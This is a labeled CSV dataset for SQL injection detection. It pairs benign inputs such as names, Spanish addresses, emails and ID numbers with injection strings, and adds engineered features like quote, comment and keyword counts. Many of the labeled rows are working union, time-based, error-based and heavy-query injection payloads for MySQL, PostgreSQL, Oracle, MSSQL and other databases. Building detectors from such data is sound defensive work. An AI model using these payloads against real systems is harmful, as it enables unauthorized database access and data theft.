Query,Label,Query_preprocessed,qlen,wcount,sq,dq,puncts,comments,spaces,logic,arith,alpha,sqlkw,sqlfunc
"1) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",1,or select count from domain domains as t1 domain columns as t2 domain tables as t3,95,16,0,0,6,0,11,1,1,64,6,1
e6749l178e3a,0,e6749l178e3a,12,1,0,0,0,0,0,0,0,4,0,0
3479188393486250,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1%' and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,and like abcdefg upper hex randomblob,66,6,3,0,3,1,2,1,3,32,2,3
"1%' union all select null,null,null,null#",1,union all select null null null null,41,7,1,0,5,1,4,0,0,30,7,0
"1"") where 1144=1144 and 2006=2006",1,where and,33,2,0,1,2,0,4,1,0,8,2,0
shalne,0,shalne,6,1,0,0,0,0,0,0,0,6,0,0
abaeto sanchon,0,abaeto sanchon,14,2,0,0,0,0,1,0,0,13,0,0
"calle astro s/n,",0,calle astro,16,2,0,0,1,0,2,0,1,12,0,0
85089975a,0,85089975a,9,1,0,0,0,0,0,0,0,1,0,0
"1"" where 9919=9919;select benchmark(5000000,md5(0x714e4153))#",1,where select benchmark md5 0x714e4153,61,5,0,1,4,1,3,0,0,24,2,2
uh7	bi,0,uh bi,8,2,0,0,0,0,1,0,0,4,0,0
teosa,0,teosa,5,1,0,0,0,0,0,0,0,5,0,0
co8descender,0,co8descender,12,1,0,0,0,0,0,0,0,11,0,0
7896,0,,4,0,0,0,0,0,0,0,0,0,0,0
1') as cdrm where 4595=4595 order by 1#,1,as cdrm where order by,39,5,1,0,2,1,7,0,0,18,4,0
"guzman de alfarache, 18,",0,guzman de alfarache,24,3,0,0,2,0,3,0,0,17,0,0
gbgsu4,0,gb gs u4,8,3,0,0,0,0,0,0,0,5,0,0
8641,0,,4,0,0,0,0,0,0,0,0,0,0,0
salgueiro 188,0,salgueiro,13,1,0,0,0,0,1,0,0,9,0,0
57970346l,0,57970346l,9,1,0,0,0,0,0,0,0,1,0,0
juglandea,0,juglandea,9,1,0,0,0,0,0,0,0,9,0,0
"1'+(select dyfw where 7743=7743 and 8407=(select count(*) from generate_series(1,5000000)))+'",1,select dyfw where and select count from generate_series,93,8,2,0,4,0,8,1,3,47,5,1
"-1598"")) or elt(5329=9628,9628) and ((""hyxq"" like ""hyxq",1,or elt and hyxq like hyxq,55,6,0,4,2,0,6,2,1,20,3,1
"1 where 2267=2267 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",1,where and dbms_pipe receive_message chr chr chr chr,94,8,0,0,12,1,4,1,2,42,2,6
"-2378"" where 2686=2686 or 6872=6872--",1,where or,37,2,0,1,2,1,4,1,3,7,2,0
15618,0,,5,0,0,0,0,0,0,0,0,0,0,0
pinnow.mcmillan3@hipernavarra.mm,0,pinnow mcmillan3 hipernavarra mm,32,4,0,0,3,0,0,0,0,28,0,0
"1) as rsyw where 4857=4857 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",1,as rsyw where or select if select from select concat 0x7171706a71 select elt 0x717a767a71 0x78,183,15,0,0,8,1,14,1,4,59,9,3
"1') as jiic where 6158=6158 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",1,as jiic where or select if select from select concat 0x7171706a71 select elt 0x717a767a71 0x78,184,15,1,0,8,1,14,1,4,59,9,3
triantap,0,triantap,8,1,0,0,0,0,0,0,0,8,0,0
soslaya,0,soslaya,7,1,0,0,0,0,0,0,0,7,0,0
eccles@aspirantes.gh,0,eccles aspirantes gh,20,3,0,0,2,0,0,0,0,18,0,0
elantxobe,0,elantxobe,9,1,0,0,0,0,0,0,0,9,0,0
repelo,0,repelo,6,1,0,0,0,0,0,0,0,6,0,0
ulpiano,0,ulpiano,7,1,0,0,0,0,0,0,0,7,0,0
"-8144') where 1691=1691 or elt(7246=7816,7816)--",1,where or elt,48,3,1,0,3,1,4,1,3,10,2,1
"1"")) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((""oxvw""=""oxvw",1,or exp select from select concat 0x7171706a71 select elt 0x717a767a71 0x78 and oxvw oxvw,125,14,0,4,7,0,9,2,1,54,6,3
39152269j,0,39152269j,9,1,0,0,0,0,0,0,0,1,0,0
19127,0,,5,0,0,0,0,0,0,0,0,0,0,0
-4562') or 3038=3038,1,or,20,1,1,0,1,0,2,1,1,2,0,0
"-5115"" union all select 1642,1642,1642,1642,1642,1642,1642,1642--",1,union all select,65,3,0,1,7,1,4,0,3,14,3,0
9274,0,,4,0,0,0,0,0,0,0,0,0,0,0
"cabaeros, 131",0,cabaeros,13,1,0,0,1,0,1,0,0,8,0,0
duchement tenza,0,duchement tenza,15,2,0,0,0,0,1,0,0,14,0,0
leobaldo,0,leobaldo,8,1,0,0,0,0,0,0,0,8,0,0
1') where 4003=4003;select sleep(5)#,1,where select sleep,36,3,1,0,3,1,3,0,0,16,2,1
burbidge@elalamorestaurante.pr,0,burbidge elalamorestaurante pr,30,3,0,0,2,0,0,0,0,28,0,0
glorieta ramiro ii 61,0,glorieta ramiro ii,21,3,0,0,0,0,3,0,0,16,0,0
sant lloren de la muga,0,sant lloren de la muga,22,5,0,0,0,0,4,0,0,18,0,0
"1)) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((5776=5776",1,and select if select from select concat 0x7171706a71 select elt 0x717a767a71 0x78 and,175,13,0,0,8,0,12,2,2,52,8,3
5e56ir2,0,5e56ir2,7,1,0,0,0,0,0,0,0,3,0,0
alentorn etayo,0,alentorn etayo,14,2,0,0,0,0,1,0,0,13,0,0
"1"") as rqpp where 9383=9383 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1,as rqpp where or select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3,129,19,0,1,7,1,15,1,3,82,8,1
gareth,0,gareth,6,1,0,0,0,0,0,0,0,6,0,0
"1%' union all select null,null,null,null,null,null,null,null,null,null--",1,union all select null null null null null null null null null null,72,13,1,0,10,1,4,0,2,54,13,0
9766800722499068,0,,16,0,0,0,0,0,0,0,0,0,0,0
rigas.albalak@albeiteria.it,0,rigas albalak albeiteria it,27,4,0,0,3,0,0,0,0,24,0,0
"1'))) or 8514=benchmark(5000000,md5(0x544d5a4c))#",1,or benchmark md5 0x544d5a4c,49,4,1,0,3,1,2,1,0,17,1,2
emberrincharse,0,emberrincharse,14,1,0,0,0,0,0,0,0,14,0,0
"1%')) union all select null,null#",1,union all select null null,33,5,1,0,3,1,4,0,0,22,5,0
2187090627457981,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",1,and select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4,107,20,0,0,8,0,13,1,1,72,7,1
salazar borja,0,salazar borja,13,2,0,0,0,0,1,0,0,12,0,0
"1'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('rfln'='rfln",1,and select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7 and rfln rfln,176,28,4,0,8,0,21,2,1,120,11,1
pech+e,0,pech,6,1,0,0,0,0,0,0,1,5,0,0
c4ap0765do,0,c4ap0765do,10,1,0,0,0,0,0,0,0,5,0,0
"calle teresa pamies i bertran 21,",0,calle teresa pamies bertran,33,4,0,0,1,0,5,0,0,25,0,0
1' or 4240=(select 4240 from pg_sleep(5))--,1,or select from pg_sleep,43,4,1,0,2,1,5,1,2,19,3,1
danilo,0,danilo,6,1,0,0,0,0,0,0,0,6,0,0
1')) rlike (select * from (select(sleep(5)))vwyq)#,1,rlike select from select sleep vwyq,50,6,1,0,1,1,5,0,1,30,4,1
1' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'omlt'='omlt,1,and cast chr chr chr chr chr select case when then else end text chr chr chr chr chr as numeric and omlt omlt,206,24,4,0,25,0,14,2,0,86,9,10
38821598j,0,38821598j,9,1,0,0,0,0,0,0,0,1,0,0
moreno undurraga,0,moreno undurraga,16,2,0,0,0,0,1,0,0,15,0,0
polesello@tantomontamontatanto.int,0,polesello tantomontamontatanto int,34,3,0,0,2,0,0,0,0,32,0,0
c/ masca 45,0,masca,11,1,0,0,0,0,2,0,1,6,0,0
"-7418 union all select 1340,1340,1340,1340,1340#",1,union all select,48,3,0,0,5,1,4,0,1,14,3,0
"1')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('aumk' like 'aumk",1,or like abcdefg upper hex randomblob and aumk like aumk,88,10,6,0,2,0,6,2,1,46,4,3
05580,0,,5,0,0,0,0,0,0,0,0,0,0,0
calle minerva 66 12?c,0,calle minerva,21,2,0,0,1,0,3,0,0,13,0,0
"plaza benidorm 155, 5?e",0,plaza benidorm,23,2,0,0,2,0,3,0,0,14,0,0
"1"") and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""ilrk""=""ilrk",1,and char char char char regexp_substring repeat left crypt_key char char char null null and ilrk ilrk,160,17,0,4,18,0,4,2,0,83,5,11
passatge arago 107,0,passatge arago,18,2,0,0,0,0,2,0,0,13,0,0
villamuriel de cerrato,0,villamuriel de cerrato,22,3,0,0,0,0,2,0,0,20,0,0
"1 union all select null,null,null,null,null,null,null,null--",1,union all select null null null null null null null null,60,11,0,0,7,1,4,0,2,46,11,0
shukuri@velaconsultores.nl,0,shukuri velaconsultores nl,26,3,0,0,2,0,0,0,0,24,0,0
-3881))) union all select 4438--,1,union all select,32,3,0,0,0,1,4,0,3,14,3,0
s9st6o,0,s9st6o,6,1,0,0,0,0,0,0,0,4,0,0
"-1755%' union all select 2615,2615,2615,2615,2615,2615#",1,union all select,55,3,1,0,7,1,4,0,1,14,3,0
pleskot@multasdetransito.mu,0,pleskot multasdetransito mu,27,3,0,0,2,0,0,0,0,25,0,0
63482988k,0,63482988k,9,1,0,0,0,0,0,0,0,1,0,0
haim.gorvin@didacramirez.tl,0,haim gorvin didacramirez tl,27,4,0,0,3,0,0,0,0,24,0,0
"1%"")));select sleep(5)#",1,select sleep,23,2,0,1,3,1,1,0,0,11,1,1
antnimo,0,antnimo,7,1,0,0,0,0,0,0,0,7,0,0
dalfolo bauls,0,dalfolo bauls,13,2,0,0,0,0,1,0,0,12,0,0
nandor,0,nandor,6,1,0,0,0,0,0,0,0,6,0,0
5128322398230292,0,,16,0,0,0,0,0,0,0,0,0,0,0
1ed6at0zacin,0,1ed6at0zacin,12,1,0,0,0,0,0,0,0,9,0,0
r54o60a,0,r54o60a,7,1,0,0,0,0,0,0,0,3,0,0
05248300e,0,05248300e,9,1,0,0,0,0,0,0,0,1,0,0
"1"") union all select null,null,null,null,null--",1,union all select null null null null null,47,8,0,1,4,1,4,0,2,34,8,0
dalleto poroma,0,dalleto poroma,14,2,0,0,0,0,1,0,0,13,0,0
parola@zonamodelos.pl,0,parola zonamodelos pl,21,3,0,0,2,0,0,0,0,19,0,0
"1' and 3824=benchmark(5000000,md5(0x76555642)) and 'pbin'='pbin",1,and benchmark md5 0x76555642 and pbin pbin,63,7,4,0,3,0,4,2,0,26,2,2
to2adora,0,to2adora,8,1,0,0,0,0,0,0,0,7,0,0
"-4596"" union all select 5761#",1,union all select,29,3,0,1,1,1,4,0,1,14,3,0
"calle arc de sant marti, 56",0,calle arc de sant marti,27,5,0,0,1,0,5,0,0,19,0,0
u,0,,2,0,0,0,0,0,0,0,0,1,0,0
"1"" union all select null,null,null,null--",1,union all select null null null null,41,7,0,1,3,1,4,0,2,30,7,0
919,0,,3,0,0,0,0,0,0,0,0,0,0,0
"blasco de garay, 168,",0,blasco de garay,21,3,0,0,2,0,3,0,0,13,0,0
kiri,0,kiri,4,1,0,0,0,0,0,0,0,4,0,0
"-1372%'))) union all select 8403,8403,8403,8403#",1,union all select,48,3,1,0,5,1,4,0,1,14,3,0
"losilla, la",0,losilla la,11,2,0,0,1,0,1,0,0,9,0,0
1'+(select 'sfko' where 6853=6853 rlike sleep(5)#,1,select sfko where rlike sleep,49,5,3,0,2,1,5,0,1,25,3,1
cancela arce,0,cancela arce,12,2,0,0,0,0,1,0,0,11,0,0
jabbari,0,jabbari,7,1,0,0,0,0,0,0,0,7,0,0
quilley0@frenchpolynesia.com.st,0,quilley0 frenchpolynesia com st,31,4,0,0,3,0,0,0,0,27,0,0
"riba, la",0,riba la,8,2,0,0,1,0,1,0,0,6,0,0
1' where 3900=3900 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,1,where and in char char char char char select case when then char else char end char char char char char,201,21,1,0,2,1,14,1,12,83,9,12
goi,0,goi,3,1,0,0,0,0,0,0,0,3,0,0
"1))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((8738=8738",1,and select count from domain domains as t1 domain columns as t2 domain tables as t3 and,115,17,0,0,7,0,13,2,1,68,7,1
"1"")));(select * from (select(sleep(5)))srmq) and (((""sxih""=""sxih",1,select from select sleep srmq and sxih sxih,64,8,0,4,2,0,5,1,1,36,4,1
sendrs tudanca,0,sendrs tudanca,14,2,0,0,0,0,1,0,0,13,0,0
xv6rec#,0,xv6rec,8,1,0,0,1,1,0,0,0,5,0,0
34708532z,0,34708532z,9,1,0,0,0,0,0,0,0,1,0,0
"1'))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((('toft'='toft",1,or exp select from select concat 0x7171706a71 select elt 0x717a767a71 0x78 and toft toft,127,14,4,0,7,0,9,2,1,54,6,3
korey_molina@juguetespersonales.gob,0,korey_molina juguetespersonales gob,35,3,0,0,3,0,0,0,0,32,0,0
8995996565558024,0,,16,0,0,0,0,0,0,0,0,0,0,0
banaei,0,banaei,6,1,0,0,0,0,0,0,0,6,0,0
"1%') and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1,and char char char char regexp_substring repeat right char null,112,10,1,0,12,1,2,1,2,53,3,8
1%');waitfor delay '0:0:5' and ('%'=',1,waitfor delay and,37,3,6,0,6,0,4,1,0,15,1,2
84881293t,0,84881293t,9,1,0,0,0,0,0,0,0,1,0,0
85673796s,0,85673796s,9,1,0,0,0,0,0,0,0,1,0,0
"1')) as xntz where 5801=5801 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",1,as xntz where or row select count concat 0x7171706a71 select elt 0x717a767a71 floor rand from select union select union select union select group by,231,24,1,0,9,1,23,1,5,109,15,5
"-3436) or elt(1032=1032,3623)",1,or elt,29,2,0,0,2,0,2,1,1,5,1,1
"1' and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and 'dubu' like 'dubu",1,and dbms_pipe receive_message chr chr chr chr and dubu like dubu,99,11,4,0,11,0,6,2,0,52,3,6
uy,0,uy,2,1,0,0,0,0,0,0,0,2,0,0
"1'||(select 'epjf' from dual where 8584=8584 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1,select epjf from dual where and select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3,147,21,3,0,9,1,16,1,3,95,9,1
8352,0,,4,0,0,0,0,0,0,0,0,0,0,0
reconfortante,0,reconfortante,13,1,0,0,0,0,0,0,0,13,0,0
1') and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('hgwt' like 'hgwt,1,and cast chr chr chr chr chr select case when then else end text chr chr chr chr chr as numeric and hgwt like hgwt,213,25,4,0,24,0,16,2,0,90,10,10
1);begin user_lock.sleep(5); end and (4610=4610,1,begin user_lock sleep end and,47,5,0,0,5,0,4,1,0,24,3,1
"1' and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",1,and select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5,99,14,1,0,10,0,10,1,1,63,3,1
"1) as hlit where 4973=4973 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1,as hlit where procedure analyse extractvalue concat 0x5c benchmark md5 0x4b774c75,117,11,0,0,6,1,6,0,0,61,2,6
"llosa de ranes, la",0,llosa de ranes la,18,4,0,0,1,0,3,0,0,14,0,0
-9434') union all select 3106#,1,union all select,30,3,1,0,1,1,4,0,1,14,3,0
tuneu,0,tuneu,5,1,0,0,0,0,0,0,0,5,0,0
aghili,0,aghili,6,1,0,0,0,0,0,0,0,6,0,0
tella-sin,0,tella sin,9,2,0,0,0,0,0,0,1,8,0,1
18505219v,0,18505219v,9,1,0,0,0,0,0,0,0,1,0,0
figuerola,0,figuerola,9,1,0,0,0,0,0,0,0,9,0,0
beomsahn,0,beomsahn,8,1,0,0,0,0,0,0,0,8,0,0
"h#!""95",0,,8,0,0,1,2,1,0,0,0,1,0,0
1') where 5540=5540 waitfor delay '0:0:5'--,1,where waitfor delay,43,3,3,0,3,1,5,0,2,17,1,2
7159056780538837,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1%"" or sleep(5)#",1,or sleep,16,2,0,1,2,1,2,1,0,7,1,1
intima,0,intima,6,1,0,0,0,0,0,0,0,6,0,0
"1 where 1656=1656 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,where and select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5,116,15,0,0,11,1,12,1,3,68,4,1
`,0,,2,0,0,0,1,0,0,0,0,0,0,0
folsom_talli@esteticadayda.tel,0,folsom_talli esteticadayda tel,30,3,0,0,3,0,0,0,0,27,0,0
1%'))) and (select * from (select(sleep(5)))gcrr)#,1,and select from select sleep gcrr,50,6,1,0,2,1,5,1,1,28,4,1
1)));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,1,select case when then else select from master sysdatabases end,98,10,0,0,4,1,11,0,3,53,8,0
v,0,,2,0,0,0,0,0,0,0,0,1,0,0
-6081 where 3681=3681 or 2603=3138--,1,where or,36,2,0,0,2,1,4,1,3,7,2,0
ekezian-wohlfeiler@cirugiaalbeiteria.lv,0,ekezian wohlfeiler cirugiaalbeiteria lv,39,4,0,0,2,0,0,0,1,36,0,0
papanduja,0,papanduja,9,1,0,0,0,0,0,0,0,9,0,0
1' in boolean mode) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)#,1,in boolean mode and cast chr chr chr chr chr select case when then else end text chr chr chr chr chr as numeric,207,24,1,0,25,1,15,1,0,88,9,10
"1%""));select case when 5308=6745 then 1 else null end--",1,select case when then else null end,55,7,0,1,3,1,8,0,2,29,7,0
chin-lin,0,chin lin,8,2,0,0,0,0,0,0,1,7,0,0
"1') as myxr where 6299=6299 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,as myxr where and char char char char regexp_substring repeat left crypt_key char char char null null,168,17,1,0,18,1,6,1,2,83,6,11
89740217j,0,89740217j,9,1,0,0,0,0,0,0,0,1,0,0
ann-margaret@indorec.pro,0,ann margaret indorec pro,24,4,0,0,2,0,0,0,1,21,0,0
mylong@deltamarina.aq,0,mylong deltamarina aq,21,3,0,0,2,0,0,0,0,19,0,0
"1%"";select count(*) from generate_series(1,5000000) and ""%""=""",1,select count from generate_series and,61,5,0,4,6,0,5,1,1,32,3,1
hanhua,0,hanhua,6,1,0,0,0,0,0,0,0,6,0,0
elbeze,0,elbeze,6,1,0,0,0,0,0,0,0,6,0,0
11954779t,0,11954779t,9,1,0,0,0,0,0,0,0,1,0,0
6onc+hesta,0,6onc hesta,10,2,0,0,0,0,0,0,1,8,0,0
macedonio,0,macedonio,9,1,0,0,0,0,0,0,0,9,0,0
',0,,1,0,1,0,0,0,0,0,0,0,0,0
desligar,0,desligar,8,1,0,0,0,0,0,0,0,8,0,0
margarit,0,margarit,8,1,0,0,0,0,0,0,0,8,0,0
sant lloren des cardassar,0,sant lloren des cardassar,25,4,0,0,0,0,3,0,0,22,0,0
00090113e,0,00090113e,9,1,0,0,0,0,0,0,0,1,0,0
garvn,0,garvn,5,1,0,0,0,0,0,0,0,5,0,0
besnehard8@itrends.tn,0,besnehard8 itrends tn,21,3,0,0,2,0,0,0,0,18,0,0
"1"" where 9342=9342 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--",1,where and qqpjq select case when then else end from rdb database qzvzq,114,13,4,1,7,1,15,1,2,58,9,1
"c/ ramos carrion, s/n 2?h",0,ramos carrion,25,2,0,0,2,0,4,0,2,16,0,0
calabazas de fuentiduea,0,calabazas de fuentiduea,23,3,0,0,0,0,2,0,0,21,0,0
91800426c,0,91800426c,9,1,0,0,0,0,0,0,0,1,0,0
1 where 9393=9393 waitfor delay '0:0:5'--,1,where waitfor delay,41,3,2,0,3,1,5,0,2,17,1,2
",",0,,1,0,0,0,1,0,0,0,0,0,0,0
khanvali,0,khanvali,8,1,0,0,0,0,0,0,0,8,0,0
dorsay@ustream.cc,0,dorsay ustream cc,17,3,0,0,2,0,0,0,0,15,0,0
ardie9temente,0,ardie9temente,13,1,0,0,0,0,0,0,0,12,0,0
alek,0,alek,4,1,0,0,0,0,0,0,0,4,0,0
"1) union all select null,null,null,null,null--",1,union all select null null null null null,46,8,0,0,4,1,4,0,2,34,8,0
"1%"")) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,and select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5,104,14,0,1,11,1,10,1,3,63,3,1
"1"")) as sqzh where 5672=5672 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,as sqzh where and select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5,127,17,0,1,11,1,14,1,3,74,5,1
zanquita,0,zanquita,8,1,0,0,0,0,0,0,0,8,0,0
1' and (5116=1602)*1602,1,and,23,1,1,0,1,0,2,1,1,3,0,0
"calle la merce, 120",0,calle la merce,19,3,0,0,1,0,3,0,0,12,0,0
"virgen del mayor dolor 188, 11?a",0,virgen del mayor dolor,32,4,0,0,2,0,5,0,0,20,0,0
01067171v,0,01067171v,9,1,0,0,0,0,0,0,0,1,0,0
61128609z,0,61128609z,9,1,0,0,0,0,0,0,0,1,0,0
3892784649587009,0,,16,0,0,0,0,0,0,0,0,0,0,0
25152,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1"") and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""cmhh"" like ""cmhh",1,and ctxsys drithsx sn chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and cmhh like cmhh,222,26,0,4,25,0,16,2,0,96,10,10
sanromn casuso,0,sanromn casuso,14,2,0,0,0,0,1,0,0,13,0,0
"1"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1,create or replace function sleep int returns int as lib libc so sleep language strict select sleep,122,17,6,1,5,1,13,1,4,83,5,4
24n1e39,0,24n1e39,7,1,0,0,0,0,0,0,0,2,0,0
"1) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (3814=3814",1,or select count from domain domains as t1 domain columns as t2 domain tables as t3 and,110,17,0,0,7,0,13,2,1,67,7,1
cracoviano,0,cracoviano,10,1,0,0,0,0,0,0,0,10,0,0
"1'))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('phdn' like 'phdn",1,or select count from domain domains as t1 domain columns as t2 domain tables as t3 and phdn like phdn,123,20,4,0,6,0,15,2,1,79,8,1
98011650w,0,98011650w,9,1,0,0,0,0,0,0,0,1,0,0
calle caro 10 10?e,0,calle caro,18,2,0,0,1,0,3,0,0,10,0,0
georges,0,georges,7,1,0,0,0,0,0,0,0,7,0,0
buleje quesada,0,buleje quesada,14,2,0,0,0,0,1,0,0,13,0,0
"travesia brieva, 171,",0,travesia brieva,21,2,0,0,2,0,2,0,0,14,0,0
09540,0,,5,0,0,0,0,0,0,0,0,0,0,0
09620,0,,5,0,0,0,0,0,0,0,0,0,0,0
princep muntadas,0,princep muntadas,16,2,0,0,0,0,1,0,0,15,0,0
"1%"";waitfor delay '0:0:5'--",1,waitfor delay,27,2,2,1,4,1,2,0,2,12,0,2
"1)) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((5888=5888",1,or select count from domain domains as t1 domain columns as t2 domain tables as t3 and,112,17,0,0,7,0,13,2,1,67,7,1
"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",1,union all select,74,3,1,0,10,1,4,0,1,14,3,0
"-7345%"" or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""%""=""",1,or ctxsys drithsx sn chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and,212,23,0,4,28,0,14,2,1,83,9,10
